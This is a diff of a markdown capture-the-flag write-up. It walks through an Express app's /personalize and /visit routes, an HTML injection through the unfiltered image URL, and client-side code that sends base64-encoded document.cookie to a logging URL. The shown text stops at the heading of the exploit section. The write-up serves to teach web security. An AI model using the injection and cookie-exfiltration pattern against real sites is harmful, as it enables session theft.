@@ -199,6 +199,7 @@ app.listen(port, async () => {
 ## GET Route:
 
 * /personalize
+
 ```js
 app.get('/personalize', (req, res) => {
     const imageUrl = req.query.image
@@ -214,12 +215,14 @@ app.get('/personalize', (req, res) => {
         res.send(escape(e.message))
         return
     }
-
 ```
+
 
 * We can Provide a Image Url with `/personalize?image=http://pic.com/pic.png`
 
 * then, Our Pic Url is Passed into a img tag
+
+
 ```html
 const pageContent =
     `
@@ -237,11 +240,13 @@ const pageContent =
         </html>
     `
 res.send(pageContent)
-
 ```
+
+
 ## POST Route:
 
 * `/visit`
+
 
 ```js
  app.post('/visit', async (req, res) => {
@@ -258,8 +263,11 @@ res.send(pageContent)
     }
 
 ```
+
 * Ex Request:
-```
+
+
+```js
 POST /visit
 Host: ...
 ...
@@ -268,6 +276,8 @@ Content-Type: application/x-www-form-urlencoded
 
 url=<url>
 ```
+
+
 ## Conditions:
 
 ```js
@@ -282,9 +292,14 @@ if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
     }
 
 ```
+
+
 * parsedUrl is a Object with key and values like Protocol, Host, Hostname, path...
 
+
 <img src="https://i.imgur.com/KE4b8jl.png">
+
+
 
 * Only HTTP and HTTPS Protocols are allowed
 * req.hostname is just the Request HOST header value.
@@ -294,9 +309,12 @@ if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
 
 ## HTML Injection:
 
+
 <img src="https://i.imgur.com/gahcR9J.png">
 
+
 * We Can Perform HTMLi bcoz, Our Input is Not Filtered and Directly passed to the below Mentioned Template.
+
 
 ```html
 <html>
@@ -334,6 +352,8 @@ if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
 * The Below Code is Client Side JAVASCRIPT code
 
 >### app.js
+
+
 ```js
 window.onload = () => {
     const imgSrc = document.getElementById('user-image').src
@@ -345,8 +365,8 @@ window.onload = () => {
         document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
     }
 }
-
 ```
+
 
 * This Javascript Loads with we Visit, `/personalize?image=<url>`
 
@@ -354,6 +374,7 @@ window.onload = () => {
 
 
 ## Exploit:
+
 
 ```js
 if (DEBUG_MODE) {
